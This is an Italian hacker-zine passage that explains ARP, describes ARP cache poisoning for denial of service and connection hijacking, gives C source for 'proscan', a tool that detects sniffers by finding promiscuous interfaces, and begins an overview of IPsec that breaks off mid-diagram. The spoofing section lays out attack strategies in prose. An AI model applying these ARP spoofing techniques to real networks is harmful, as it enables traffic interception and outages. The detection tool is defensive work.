Tutti i valori possibili sono contenuti nell'header if_arp.h e ethernet.h
nella dir /usr/include/net/

Quando ci colleghiamo ad una macchina nella nostra LAN, lo stack TCP/IP
richiede mediante query ARP quale sia l'indirizzo hardware della macchina
che ha come IP quello che il DNS (o una tabella statica come /etc/hosts) ci
ha comunicato:

BFi $ telnet BFIhome
Trying 192.168.1.7...
Connected to BFihome.
Escape character is '^]'.

dietro le quinte possiamo vedere con tcpdump la richiesta ARP:

15:13:29.181972 arp who-has BFihome tell BFi
15:13:30.176932 arp reply BFihome is-at 0:0:c0:1e:6f:26

Ecco che l'host interpellato risponde con il suo indirizzo a 48bit, dopodiche'
la comunicazione TCP avviene normalmente.

Ma, vi chiederete, com'e' possibile che BFihome abbia ricevuto la
richiesta ARP se BFi non sapeva quale fosse l'indirizzo ethernet cui inviare
il pacchetto? E' effettivamente questo il punto. Semplice.
L'indirizzo ethernet specificato come destinatario e' ff:ff:ff:ff:ff:ff
ovvero l'indirizzo di BROADCAST, in modo che tutte le macchine possano
saggiare il pacchetto e decidere cosa farne. A quel punto il layer ethernet
preleva il pacchetto, capisce dal frame type uguale a 0x806 che si tratta di
operazioni ARP, quindi il sottosistema ARP controlla l'indirizzo IP oggetto
della query. Se corrisponde a quello della scheda di rete della macchina,
allora dara' il via ad una risposta ARP.

Ora il primo hack per ARP :)
Abbiamo visto come prima sia stato possibile distruggere connessioni TCP
molto facilmente in una LAN. Ora pensate ad una cosa. Quello che possiamo
fare con ARP e' potentissimo. Possiamo inviare risposte ARP per conto di
altri host, specificando un diverso indirizzo ethernet per creare due tipi
di attacco. Un DoS ed un hijack.

Per il DoS e' semplicissimo. Si tratta di specificare un indirizzo a 48bit
inesistente nella LAN, in modo che i pacchetti vadano nel vuoto piu'
assoluto. Non sarebbero piu' possibili connessioni di alcun genere.

Per l'hijack invece si tratta di specificare il nostro indirizzo! Con questo
potremmo redirigere il flusso della connessione al nostro host.
Beh, vi chiederete, a che pro farlo rispetto al semplice sniffer?
Manipolando le cache ARP possiamo ridirottare il traffico di host oltre a
switch locali in modo da ottenere flussi di dati di macchine normalmente
al di la' della portata del nostro sniffer.

Ora ci sono due problemi: come inviare pacchetti ARP e quando farlo. Beh,
il primo problema e' facilmente risolvibile. Sotto linux esiste un accesso
mediante chiamata socket(2) che permette di raggiungere il livello datalink,
il livello hardware. SOCK_PACKET viene comunemente usato per sniffare
sulla LAN. Ma puo' essere utilizzato anche per inviare pacchetti comprensivi
di header hardware. Bisogna pero' ricordare che in questo caso il kernel
NON fara' alcunche' ai nostri pacchetti, dovremo pensare noi anche alla
frammentazione, nel caso servisse... Quindi non bisogna saltare alcun campo
delle varie strutture che ci servono, compresa quella dell'interfaccia
ethernet.

La specifica e' in ethernet.h in /usr/include/net/ :

/* 10Mb/s ethernet header */
struct ether_header
{
  u_int8_t  ether_dhost[ETH_ALEN];      /* destination eth addr */
  u_int8_t  ether_shost[ETH_ALEN];      /* source ether addr    */
  u_int16_t ether_type;                 /* packet type ID field */
};

Per il quando farlo ci sono sostanzialmente due modi: monitorare le
richieste ARP rispondendo prima degli host legali, oppure mediante continue
risposte ARP inviate ogni tot secondi a seconda del tempo di cancellamento
della cache ARP. Esiste anche la cosiddetta gratuitous ARP ovvero una
richiesta ARP fatta a se' stessi. Questo da un lato serve a vedere se non ci
siano gia' altri host con lo stesso IP, ma soprattutto a controllare eventuali
cambi di indirizzo. Quello che non tutti sanno e' che essendo anche questa
richiesta in BROADCAST, tutte le macchine della LAN terranno conto del nuovo
indirizzo ethernet, facendo cosi' l'update delle loro cache. Non tutti gli
stack reagiscono pero' allo stesso modo.

Un modo per costringere linux ad inserire nella cache un'entry e' quello
di eseguire una richiesta ARP da parte dell'host che intendiamo spoofare,
hijackare o DoSare (povero italiano :) verso l'host di cui vogliamo
corrompere la cache, usando il NOSTRO indirizzo hardware.

Esiste poi l'unsolicited ARP in cui rispondiamo senza avere richiesta. In
questo caso di default, linux NON accetta reply.

M A N I P O L A Z I O N I   A R P
alla ricerca di sniffer nella LAN

Ora pero' vi mostro un aspetto interessante dal punto di vista della
sicurezza. Tutti sanno quali effetti possano avere gli sniffer in una rete
locale, aziendale, universitaria... qualunque rete con qualche decina
di macchine ed utenti vogliosi di connettersi a destra e a manca.
Collezionare centinaia di coppie login/password per centinaia di siti e'
una impresa da poco per uno sniffer ben posizionato. E tutti gli admin
sanno quanto sia noioso cercare macchina per macchina gli indizi di uno
sniffer all'opera.

Spesso l'unico tratto saliente e' quello dell'attivazione della modalita'
promiscua delle interfacce di rete. Questa permette di agire e vagliare
pacchetti non specificatamente indirizzati alla macchina su cui lo sniffer
gira, ma potenzialmente TUTTI quelli di passaggio nella LAN. Questo
permette di controllare le connessioni di tutta la rete locale usando un
solo processo su di una sola macchina.

Ebbene ricordiamo adesso come vengano processate le richieste ARP. Il
livello hardware controlla i pacchetti che abbiano come destinazione
hardware l'indirizzo a 48bit di broadcast o multicast, e ne controllano
gli IP contenuti per sapere se, ed a chi, rispondere. Tutte le macchine
SONO costrette a rispondere ad una richiesta ARP, a meno che il kernel non
sia stato modificato o non sia all'opera nella LAN un proxy ARP che
gestisce il flusso ARP in maniera centralizzata.

Aggiungiamo a questo che uno sniffer ponga una interfaccia in modalita'
promiscua, consentendo al kernel di ricevere tutti i pacchetti presenti
nella LAN. Possiamo ipotizzare che lo stack ARP del kernel, accettando
la scheda pacchetti non indirizzati ad essa, possa processare richieste ARP
che pur NON usino destinazioni ethernet broadcast.

Se in questo caso ottenessimo risposta avremmo conferma della promiscuita'
della interfaccia di rete di una macchina, buon indice di uno sniffer
all'opera; questo ci permetterebbe di restringere la ricerca nelle nostre
reti e ci permetterebbe, come admin, di gestire il controllo in maniera
automatizzata anche mediante crond, ad esempio.

Questo concetto, uscito su comp.security.unix e' stato implementato in un
tool degli Apostols che prende il nome di NEPED. Quello che ho fatto e'
stato di ricodarlo e di AVERVI AGGIUNTO una nuova opzione. Prima di
spiegare quale o di mostrare il codice, un preambolo.

Il sistema delle query ARP funziona sui kernel linux fino a 2.0.35 ...
ma quasi tutte le macchine installate di fresco adesso montano il kernel
2.0.36 che ha introdotto delle modifiche per quanto riguarda la gestione
del sottosistema ARP, rendendo INUTILIZZABILE neped.c in quanto i
risultati non sono piu' sicuri. Vediamo perche'.

/usr/src/linux/net/ethernet/eth.c@204.299  (riga 204 di 299)

        else if(dev->flags&(IFF_PROMISC))
        {
                if(memcmp(eth->h_dest,dev->dev_addr, ETH_ALEN))
                        skb->pkt_type=PACKET_OTHERHOST;
        }

qui se la flag IFF_PROMISC e' stata settata per l'interfaccia di rete, allora
il tipo di pacchetto viene considerato non indirizzato alla nostra
interfaccia, dopo aver ovviamente controllato che l'indirizzo non corrisponda
e non sia BROADCAST (190.299).

/usr/src/linux/net/ipv4/arp.c@1774.2509

        if(skb->pkt_type == PACKET_OTHERHOST)
        {
                kfree_skb(skb, FREE_READ);
                return 0;
        }

qui notiamo per la prima volta nel kernel 2.0.36 che nel caso il tipo di
pacchetto, specificato nel buffer skb sia PACKET_OTHERHOST, allora il
buffer viene scartato e non avviene processo ARP. Quindi la destinazione
hardware dei pacchetti ARP dev'essere BROADCAST o MULTICAST, oppure deve
corrispondere al valore locale. Questo annulla ogni risultato di neped.c
qualora venga effettuato lo scan su macchine con 2.0.36 ... e non permette
neanche di modificare l'indirizzo in BROADCAST in quanto questo negherebbe
la deduzione sulla modalita' promiscua.

Non c'e' quindi modo di sapere se ci siano sniffer su macchine
con 2.0.36 ???? SI' CHE C'E' :)))) ed ora lo vedremo.

Ho controllato dentro ai sorgenti del kernel di linux ed ho visto che lo
stack relativo a ICMP permette un giochino simile a quello fatto con ARP.
Ovvero possiamo creare delle richieste di tipo ECHO indirizzandole ad
ethernet inesistenti. Ebbene, le macchine con kernel 2.0.36, ed inferiori
ovviamente, risponderanno allegramente alla query con un ECHO_REPLY se la
loro interfaccia e' in modalita' promiscua.

Vediamo ora il codice.

---------- snip ----------
/************************************************************************
* proscan.c             PROMISC Ethernet Scanner			*
*                                                                       *
*			Questo tool permette la scansione di un LAN	*
*			alla ricerca di interfacce di rete in modalita' *
*			promiscua. L'effetto viene ottenuto mediante	* 
*			utilizzo di query 'anomale'.			* 
*			Per la spiegazione vedere l'articolo " TCP/IP 	*
*			Hacks For Phun And Profit" su BFi5.		*
*			    BFi e' disponibile al seguente URL:		*
*			       http://softpj98.bbk.org/bfi/		*
*                                                                       *
* OS:                   Linux (SOCK_PACKET)               		*
* Credits:		Apostols, comp.security.unix, vari sniffer :)   * 
*                                                                       *
*                       NO(C)1998 FuSyS TCP/IP Tools Unlimited  	*
************************************************************************/

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/time.h>
#include <netinet/if_ether.h>
#include <net/if.h>
#include <ioctls.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <time.h>

#define MAX_LEN		1500
#define IF_LEN		14
#define IP_ALEN		4
#define IP_HLEN         20
#define ICMP_HLEN       8

struct arp_hack {
	unsigned char h_dest[ETH_ALEN];
	unsigned char h_source[ETH_ALEN];
	unsigned short h_proto;
	unsigned short ar_hrd;
	unsigned short ar_pro;
	unsigned char ar_hln;
	unsigned char ar_pln;
	unsigned short ar_op;
	unsigned char ar_sha[ETH_ALEN];
	unsigned char ar_sip[IP_ALEN];
	unsigned char ar_tha[ETH_ALEN];
	unsigned char ar_tip[IP_ALEN];
};

struct pinghack {
        unsigned char h_dest[ETH_ALEN];
        unsigned char h_source[ETH_ALEN];
        unsigned short h_proto;
        unsigned char ihl_ver;
        unsigned char tos;
        unsigned short tot_len;
        unsigned short id;
        unsigned short frag_off;
        unsigned char ttl;
        unsigned char protocol;
        unsigned short check;
        unsigned long saddr;
        unsigned long daddr;
        unsigned char type;
        unsigned char code;
        unsigned short checksum;
        unsigned short icmp_id;
        unsigned short icmp_seq;
};

unsigned char mac[ETH_ALEN];
unsigned long dip, sip, netmask, broadcast, dmp, saddr;
char packet[MAX_LEN], *ptr;

void uso(void) {
        fprintf(stderr,"Uso: proscan -[a,p] <interfaccia>\n");
        exit (0);
}

char *ntoa(unsigned long ip) {
        static char buff[18];
        char *p;
        p = (char *) &ip;
        sprintf(buff, "%d.%d.%d.%d",
                (p[0] & 255), (p[1] & 255), (p[2] & 255), (p[3] & 255));
        return(buff);
}

char *dumpHW (unsigned char *hw_s) {
	static char buffer[ETH_ALEN];
	sprintf(buffer, "%02x:%02x:%02x:%02x:%02x:%02x",
	   hw_s[0], hw_s[1], hw_s[2], hw_s[3], hw_s[4], hw_s[5]);
	return buffer;
}

unsigned short ip_fast_csum(unsigned char * iph, unsigned int ihl) {
        unsigned int sum;

        __asm__ __volatile__("
            movl (%1), %0
            subl $4, %2
            jbe 2f
            addl 4(%1), %0
            adcl 8(%1), %0
            adcl 12(%1), %0
1:          adcl 16(%1), %0
            lea 4(%1), %1
            decl %2
            jne 1b
            adcl $0, %0
            movl %0, %2
            shrl $16, %0
            addw %w2, %w0
            adcl $0, %0
            notl %0
2:
            "
        : "=r" (sum), "=r" (iph), "=r" (ihl)
        : "1" (iph), "2" (ihl));
        return(sum);
}

int main (int argc, char **argv) {

	struct arp_hack *hack_p;
	struct pinghack *ping;
	struct ifreq ifr;
	struct sockaddr sa;
	int opt, sockfd, fd_flags, len, sa_len, pid, sent, optA=0, optP=0;

        if (geteuid() || getuid()) {
                fprintf(stderr, "Per utilizzare proscan devi essere Root\n",
			argv[0]);
                exit(0);
        }

  	if (argc < 3) uso();

	while ((opt = getopt(argc, argv, "ap")) != EOF) {
                switch(opt)
                {
                        case 'a':
                                optA=1;
                                break;
                        case 'p':
                                optP =1;
                                break;
                        default:
                                exit(1);
                                break;
                }
        }

	if(optA && optP) {
		fprintf(stderr, "\nNon puoi usare -a e -p insieme !!!\n");
		exit(1);
	}

	printf("\n\033[1;32m---]  P R O m i s c  S C A N n e r  [---\033[0m\n");
	printf("\033[1;34mno(C)1999 FuSyS - TCP/IP Tools Unlimited\033[0m\n");

	if(optA)
    	if((sockfd=socket(AF_INET, SOCK_PACKET, htons(ETH_P_ARP))) <0) {
        	perror("SOCK_PACKET: problemi di allocazione\n");
        	exit(0);
    	}
	if(optP)
	if((sockfd=socket(AF_INET, SOCK_PACKET, htons(ETH_P_IP))) <0) {
                perror("SOCK_PACKET: problemi di allocazione\n");
                exit(0);
        }

  	strcpy (ifr.ifr_name, argv[2]);
  	if (ioctl (sockfd, SIOCGIFHWADDR, &ifr) < 0) {
    		perror("Non ho trovato l'indirizzo hardware locale !\n");
    		exit(1);
  	}
	memcpy(mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
	printf("\n\033[1;34m MAC Locale: \033[1;32m%s\033[0m\n", 
		dumpHW(mac));
	
	if (ioctl (sockfd, SIOCGIFADDR, &ifr) < 0) {
    		perror ("Non ho trovato l'indirizzo IP locale !\n");
    		exit(1);
  	}
	memcpy ((void *) &sip, (void *) &ifr.ifr_addr.sa_data + 2, IP_ALEN);
	printf ("\033[1;34m IP Locale : \033[1;32m%s\033[0m\n", 
		ntoa(sip));

	if (ioctl (sockfd, SIOCGIFNETMASK, &ifr) < 0) 
		fprintf(stderr, "Non ho trovato l'indirizzo NETMASK !");
  	memcpy ((void *)&netmask, (void *)&ifr.ifr_netmask.sa_data+2, IP_ALEN);
	printf ("\033[1;34m NETMASK   : \033[1;32m%s\033[0m\n", 
		ntoa(netmask));

	if (ioctl (sockfd, SIOCGIFBRDADDR, &ifr) < 0)
    		fprintf(stderr, "Non ho trovato l'indirizzo BROADCAST !\n");
  	memcpy((void *)&broadcast,(void *)&ifr.ifr_broadaddr.sa_data+2,IP_ALEN);
	printf ("\033[1;34m BROADCAST : \033[1;32m%s\033[0m\n", 
		ntoa(broadcast));

	if(optA)
	printf("\033[1;34m TECNICA   : \033[1;32mARPOP_REQUEST\033[0m\n");
	if(optP)
	printf("\033[1;34m TECNICA   : \033[1;32mICMP_ECHO\033[0m\n");
	fcntl(sockfd, F_GETFL);
  	fcntl(sockfd, F_SETFL, fd_flags | O_NONBLOCK);

	printf("\n\033[1;34m.oO Inizio Scansione Oo.\033[0m\n\n");
	
	if(optA)
	 for(dip=(ntohl(sip)&ntohl(netmask))+1;dip<ntohl(broadcast);dip++) {
		if(htonl(dip) == sip) {
                        dip++;
                }
		memset(&packet, 0, MAX_LEN);
		hack_p = (struct arp_hack *) packet;	
		
		memcpy (hack_p->h_dest, "\0\1\0\1\0\1", ETH_ALEN);       
		memcpy (hack_p->h_source, mac, ETH_ALEN);
		hack_p->h_proto = htons(ETH_P_ARP);
		hack_p->ar_hrd = htons(ARPHRD_ETHER);
		hack_p->ar_pro = htons(ETH_P_IP);
		hack_p->ar_hln = 6;
		hack_p->ar_pln = 4;
		hack_p->ar_op = htons(ARPOP_REQUEST);
		memcpy (hack_p->ar_sha, mac, ETH_ALEN);
		memcpy (hack_p->ar_sip, &sip, IP_ALEN);
		memcpy (hack_p->ar_tha, "\0\0\0\0\0\0", ETH_ALEN);
		dmp=htonl(dip);
		memcpy (hack_p->ar_tip, &dmp, IP_ALEN);

		strcpy(sa.sa_data, argv[2]);
      		sa.sa_family = AF_UNIX;

      		if( sendto (sockfd, packet, sizeof (struct arp_hack), 0, 
			&sa, sizeof(sa)) <0)          
				fprintf(stderr, "errore sendto\n");

      		usleep (50);
		memset(&packet, 0, MAX_LEN);
                hack_p = (struct arp_hack *) packet;

      		len = recvfrom (sockfd, packet, MAX_LEN, 0, &sa, &sa_len);
      		if (len <= IF_LEN) continue;

		memcpy (&dmp, hack_p->ar_tip, IP_ALEN);
      		memcpy (&saddr, hack_p->ar_sip, IP_ALEN);

      		if ( ntohs(hack_p->ar_op) == ARPOP_REPLY
          		&& dmp == sip && (dip-ntohl(saddr) >= 0 )
          		&& (dip-ntohl(saddr) <= 2 ) ) {
          	printf ("\033[1;32mIP %s, MAC %s - \033[5;32mModalita' Promiscua !\033[0m\n", 
			ntoa(saddr), dumpHW(hack_p->ar_sha));
        	}
	   }

	if(optP)
	 for(dip=(ntohl(sip)&ntohl(netmask))+1;dip<ntohl(broadcast);dip++) {
                if(htonl(dip) == sip) {
                        dip++;
                }
                sa_len = sizeof(struct sockaddr);
                memset(&sa, 0, sa_len);
                sa.sa_family = AF_UNIX;
                strcpy(sa.sa_data, argv[2]);
                
		memset(&packet, 0, MAX_LEN);
                ping = (struct pinghack *) packet;
                ptr = packet;
                
		memcpy(ping->h_dest, "\0\1\0\1\0\1", ETH_ALEN);
                memcpy(ping->h_source, mac, ETH_ALEN);
                ping->h_proto = htons(ETH_P_IP);
                ping->ihl_ver = 0x45;
                ping->tos = 0x00;
                ping->tot_len = htons(IP_HLEN+ICMP_HLEN);
                ping->id = 0x0000;
                ping->frag_off = 0x0000;
                ping->ttl = 0xFF;
                ping->protocol = IPPROTO_ICMP;
                ptr += 26; *((u_long *)ptr) = sip;
                ptr += 4; *((u_long *)ptr) = htonl(dip);
                ping->check = 0;
                ping->check = ip_fast_csum((unsigned char *)
                        ping+ETH_HLEN, 20);
                ptr +=4; *((u_char *)ptr) = 8;
                ptr +=1; *((u_char *)ptr) = 0;
                ptr +=3; *((u_short *)ptr) = pid;
                ptr +=2; *((u_short *)ptr) = 0xF001;
                ping->checksum = 0;
                ping->checksum = ip_fast_csum((unsigned char *)
                        ping+(ETH_HLEN+IP_HLEN), 8);

                if((sent=sendto(sockfd, &packet, ETH_HLEN+IP_HLEN+ICMP_HLEN, 0,
                        &sa, sa_len)) < 0 ) {
                        fprintf(stderr, "Errore sendto\n");
                        return(-1);
                }
                usleep(50);
                memset(&packet, 0, MAX_LEN);
                ptr = packet;

                len = recvfrom (sockfd, packet, ETH_HLEN+IP_HLEN+ICMP_HLEN, 0,
                        &sa, &sa_len);
                if (len <= ETH_HLEN) continue;

                ptr +=34;
                if(*((u_char*)ptr) == 0) {
                   ptr +=6;
                   if(*((u_short*)ptr) == 0xF001) {
                        ptr -=14;
                        if((dip - ntohl(*((u_long*)ptr)) >= 0) &&
                           (dip - ntohl(*((u_long*)ptr)) <= 2)) {
                  	printf ("\033[1;32mIP %s - <ECHOREPLY> \033[5;32mModalita' Promiscua !\033[0m\n", 
				ntoa(*((u_long*)ptr)));
                                }
                        }
                }
        }		
  	printf("\n\033[1;34m.oO  Fine Scansione  Oo.\033[0m\n\n");
	exit (0);
}
---------- snip ----------

Semplicemente alla linea di comando specificate con -a la query di tipo
ARPOP_REQUEST e con -p la query di tipo ICMP_ECHO. Come secondo argomento
inserite il nome della vostra interfaccia, ad esempio eth0, in modo che il
codice possa trovare i valori necessari ad identificare la vostra LAN.

Nel codice e' ben mostrato il concetto della creazione di pacchetti
mediante SOCK_PACKET, che siano IP o meno (ARP). Ricordate che ogni campo
degli header dev'essere onorato in quanto il kernel NON FARA' proprio
nulla per aiutarci nel calcolo dei checksum o nel byte order dei dati.

Putroppo ho notato or ora (qualche giorno dopo) che nel nuovo kernel 2.2.1
esiste un controllo simile a quello di 2.0.36 anche per quanto riguarda
ICMP:

/usr/src/linux/net/ipv4/icmp.h@515.1128

        if (skb_in->pkt_type!=PACKET_HOST)
                return;

hmmm. Sebbene non controlli se l'interfaccia fosse promiscua
(PACKET_OTHERHOST da eth.c) non risponde nel caso l'indirizzo ethernet
non sia esatto. 

Al momento non sono molte le installazioni con kernel 2.2.x ma nel caso ne
aveste nella vostra LAN e voleste controllare anche quelli dovreste
ricompilare il kernel modificando a scelta arp.c o icmp.c (o entrambi) in
modo che rispondano a query anomale come quelle di proscan.c

Questo non dara' problemi particolari a meno che anche gli attaccanti che
hanno inserito lo sniffer sappiano come e' stato modificato il kernel ed
in quel caso sarebbero solo possibili banali DoS, ma riconducibili ad un
uso di ping(8) ad esempio, il che non sarebbe vantaggioso neanche per uno
sniffer a caccia sulla LAN.

Per modificare arp.c nei 2.2.x :

/usr/src/linux/net/ipv4/arp.c@545.1138

        if (in_dev == NULL ||
            arp->ar_hln != dev->addr_len    ||
            dev->flags & IFF_NOARP ||
            skb->pkt_type == PACKET_OTHERHOST ||
            skb->pkt_type == PACKET_LOOPBACK ||
            arp->ar_pln != 4)
                goto out;

eliminate il controllo (o commentatelo) su PACKET_OTHERHOST, mentre in
icmp.c (come visto prima) aggiungete un controllo condizionale per questo
parametro. A quel punto proscan sara' ancora in grado di rilevare
interfacce promiscue nelle vostre reti, aiutandovi nella gestione della
sicurezza.

							FuSyS

P.S. 	per chi avesse domande puo' mandare mail alla redazione di BFi,
	sicuro che mi verranno forwardate :) e cerchero' di rispondervi.

P.P.S.	ormai pronta la beta di TH0T in grado di fare quanto teorizzato
	nei miei articoli su TCP/IP ed anche oltre :) Spero di potervi
	dare presto un URL per screenshots e sorgenti. Si', per UN!X :)


------------------------------[ i P S E C ]-----------------------------------
-------------------------[ ARCHiTETTURA Di BASE ]-----------------------------
--------------------------------[ FuSyS ]-------------------------------------

NO(C)1999 FuSyS

#############################################################################
DISCLAIMER
Ragazzi ve lo dico. Preparatevi ad un overflow di acronimi, molti sono di
tipo TLA, quindi fuori le aspirine, l'acutil fosforo o le vostre sostanze
preferite. Questo e' un sunto tecnico di RFC, white papers e testi letti
in giro su IPSec. No. Non sulle brochures dei firewall allo SMAU :)
#############################################################################

Questo articolo vuole descrivere l'architettura base di IPSec. Proposto e
creato per far fronte alle richieste di sicurezza emerse nel RFC1636, IPSec
dovrebbe porre fine ai problemi che sembrano affliggere (guarda un po' :)
la rete da ormai qualche anno.

La proposta e' tutto fuorche' recente. I vari RFC sono stati avanzati nel
lontano 1995 dalla IETF e sono: RFC1825, RFC1826, RFC1827, RFC1828 ed
RFC1829. Eppure questo articolo NON e' affatto in ritardo. Questo perche'
l'implementazione pratica dell'architettura non e' uno standard ed anzi
viene lasciato ai produttori largo spazio alla creativita' e disponibilita'
all'utilizzo di diverse caratteristiche, che facciano comunque capo agli RFC.
Infatti IPSec e' da ritenersi obbligatorio solo per IPv6 ed appena opzionale
per IPv4. Fatto che sta comunque permettendo a vari prodotti di router e
firewall di presentare soluzioni per VPN che si basino su IPSec.

I servizi di base vengono forniti al livello del layer IP. Cosa vuol dire
questo? Semplicemente trasparenza nei confronti delle applicazioni.

Pensiamo ad esempio alla crittografia dei dati in corso di trasmissione,
come con SSH. In questo caso c'e' bisogno di un protocollo apposito, ma
anche e soprattutto di un'architettura client/server differente dalla
usuale telnet o rlogin. Quindi le diverse parti possono trasmettere solo
se tutte siano in possesso dei servizi SSH.

SSL invece si trasferisce a livello del layer di trasporto. Infatti noi
possiamo usare un browser quale Netscape indipendentemente per server
normali o sicuri, utilizzando un sistema di crittografia mediante chiavi
che critta lo stream TCP. Ma in questo caso NON posso ad esempio usare un
server sicuro con lynx. Ho quanto meno bisogno di un modulo o patch per
lynx perche' possa usare SSL. Esistono, e' vero, implementazioni gratuite
di SSL, quali SSLeay dell'autore di libdes. Ma ogni codice deve essere
linkato alla libreria opportuna.

Spostandoci a livello IP con IPSec, invece, potremo continuare ad usare il
nostro caro vecchio telnet, da bravi utenti pigroni, senza che il nostro
admin si debba mai preoccupare (si spera :) delle password inviate.
A dire il vero per gli utenti comuni e le loro applicazioni non cambiera'
proprio un accidenti, almeno finche' non si parla di possibili argomenti
tipo policy, uso/scambio di chiavi user/user piuttosto che host/host (vedi
dopo). Potranno lavorare come prima, lasciando che sia il layer base ad
occuparsi di:

-controllo degli accessi
-integrita' dei dati
-autenticazione dell'origine della trasmissione
-rifiuto di pacchetti ritrasmessi (tipico attacco contro Kerberos e PPTP)
-confidenzialita' dei dati (crittazione)

IPSec dovrebbe garantire tutto questo mediante l'utilizzo di due nuovi
protocolli: uno di autenticazione basato sull'header AH, Authentication
Header; l'altro di autenticazione e crittografia basato sull'header ESP,
Encapsulating Security Payload. 

SA - Associazioni di Sicurezza

Questo e' un concetto chiave dell'implementazione. Un SA e' una relazione
univoca tra originante e destinatario che permette l'uso dei sistemi di
sicurezza per il flusso di dati della loro trasmissione. Nel caso ci debba
essere una relazione di tipo peer si dovranno usare due SA, una per verso
della trasmissione. Ogni SA e' definito da tre parametri:

1)	SPI - Security Parameters Index 
	Si tratta semplicemente di una stringa di bit presente su ogni
	pacchetto inviato, che permetta di far riferimento alla SA in uso.

2)	indirizzo IP di destinazione
	
3)	Security Protocol Identifier
	Questo indica se sia in uso una SA con AH o con ESP.

Come vengono gestite o scelte queste SA? In ogni implementazione deve
essere presente, anche se non viene bene spiegato come, [e' praticamente
evidente che ogni produttore abbia le mani libere] un database di SA, o
SAD :), che definisca per ogni SA questi parametri:

	Sequence Number Counter
	Un valore a 32bit usato per generare il numero di sequenza negli
	header AH e ESP

	Sequence Number Overflow
	Una flag per indicare se dopo overflow del numero di sequenza si 
	debba generare un log e prevenire ulteriori trasmissioni di
	pacchetti nella SA in corso

	Anti-Replay Window
	Usata per capire se un pacchetto inbound di tipo AH o ESP sia un
	reinvio invece di un originale

	AH Info
	Algoritmi di autenticazione, chiavi, validita' delle stesse, e
	parametri relativi.

	ESP info
	Idem come sopra, con marcato riguardo alla crittografia

	Lifetime
	Intervallo di tempo o di byte dopo il quale sia necessario variare
	SA o terminare la connessione.

	IPSec Protocol Mode
	Tunnel, trasporto o *

	MTU

Ora che siamo parecchio nella melma, relativamente a tutti questi
parametri, cerchiamo di capire come effettivamente vengano utilizzati o
finalizzati allo scopo di "Servire e Proteggere"(C).

IPSec fornisce all'amministratore notevole flessibilita' di spceifica
relativamente alle SA. Esiste una sorta di database delle policy, o SPD,
Security Policy Database, che gestisce dei record ognuno dei quali puo'
associare un determinato flusso di dati IP ad una o piu' SA insieme per
fornire la protezione ed integrita' desiderata ai nostri dati.

Un po' come le rules dei firewall, in grado di avere dei positivi o
negativi a seconda del tipo di traffico, ed in base a questi agire secondo
le rules stesse. Ogni record dentro al SPD contiene i selettori delle SA,
che devono essere comparati con quelli contenuti nei pacchetti della
trasmissione e la serie di SA associate a quei selettori. Dopodiche' il
sistema sara' in grado di operare il processo IPSec.

I selettori usati per l'associazione delle SA sono:

-	indirizzi IP sorgente/destinazione
	Abbastanza ovviamente, come per i firewall possiamo discriminare
	in base ai punti base del traffico. Potremo specificare indirizzi
	unicast, wildcard e range di indirizzi. Se useremo delle wildcard
	o dei range potremo ovviamente mappare piu' SA a seconda di
	ulteriori altri selettori discriminanti.

-	UserID
	Ehi questo e' interessante davvero. Poter finalmente discriminare
	in base agli sgarbi subiti :). Cioe' no, in base alle richieste o
	necessita' di singoli utenti, piuttosto che di interi sistemi.

-	Data Sensivity Level
	WOW. Non solo utenti, ma anche tipo di dati maneggiati, divisibile
	in Secret o Unclassified.

-	Transport Layer Protocol
	Ehi il solito campo ip->protocol del caro IPv4 o ip->nexthdr
	del novello IPv6.

-	IPSec Protocol
	AH o ESP

-	porte sorgente/destinazione
	univoche, range o wildcard ovviamente :)

-	IPv6 Class e Flow Label
	Ottenuti dall'header IPv6

-	IPv4 TOS
	Type Of Service

Ok. Ora sappiamo, piu' o meno, come dovrebbe decidere lo stack IPSec sul
da farsi. Ma una volta deciso? Esistono due modalita' principali di
funzionamento: trasporto e tunnel.

TRASPORTO

Questa modalita' gestisce protezione in primo luogo solo per i protocolli
dei layer soprastanti. Ovvero si associa al cosiddetto payload, carico
dei pacchetti IP. Questo vuol dire, ad esempio, gli header TCP/UDP, quelli
ICMP, ed i dati ad essi connessi. Quindi usando AH o ESP verranno
protetti, autenticati o criptati solo i dati dopo l'header IP, in IPv4
subito dopo, in IPv6 dopo gli header estesi. ESP cripta solo il carico,
laddove AH lo autentica occupandosi anche di alcuni campi dell'header IP.

TUNNEL

In questo modo invece e' possibile fornire ed estendere la protezione
all'intero pacchetto IP. Questo perche' viene incapsulato all'interno di
un nuovo stream punto punto in nuovi pacchetti IP, dopo che gli originali
siano stati sottoposti ad AH o ESP. Questo incapsulamento e' alla base
delle cosiddette VPN, o Virtual Private Networks. Vediamo uno schema:

IP prima
	---------------------------
	| IPHDR	|  PAYLOAD A/B    |
	---------------------------

 HOST A <-----> FIREWALL/GATEWAY1
			|
			|  INCAPSULAMENTO PER VPN
			|
			|
			--------------FIREWALL/GATEWAY2 <-----> HOST B


IP durante l'incapsulamento operato dai gateway

	-----------------------------------------
	| IPHDR GW<>GW	| IPHDR	| PAYLOAD A/B	|
	-----------------------------------------
			payload dell'IP incapsulato

Come possiamo vedere ora il pacchetto IP e' stato rinchiuso all'interno
di un nuovo pacchetto, che mostra i dati relativi alla connessione tra i
due gateway e NON quelli relativi ad A<>B ... il GW dell'host destinatario
si adoprera' per decapsulare il pacchetto e trasmetterlo al legittimo
destinatario. Ovviamente, se protetto con ESP non sara' possibile capire che
il payload del secondo pacchetto sia in realta' un pacchetto IP incapsulato.
Conseguenze prime: riservatezza e possibilita' di non divulgare all'esterno
nomi ed indirizzi di sistemi privati. Questo almeno finche' i gateway non
siano compromessi.

AH - AUTHENTICATION HEADER

Questo header fornisce un supporto per l'integrita' e l'autenticazione dei
dati trasmessi e delle parti in causa nella trasmissione. La prima
dovrebbe garantire che i pacchetti non siano stati in alcun modo alterati
durante il loro tragitto, mentre la seconda fornisce un aiuto per il
riconoscimento del sistema od utente remoto, oltre ad IMPEDIRE attacchi di
spoofing. Oltretutto garantisce contro attacchi di replay dei pacchetti.
Questi tipi di autenticazione sono basati su di un codice di
autenticazione dei messaggi, o MAC, che richiede l'uso di una chiave
segreta per entrambe le parti.

Vediamo ora questo AH:

	0		 8		 16			31
	---------------------------------------------------------
	|  next header  |  payload len  |        RESERVED	|
	---------------------------------------------------------
	|	   Security Parameters Index (SPI)		|
	---------------------------------------------------------
	|		  Sequence Number 			|
	---------------------------------------------------------
	|							|
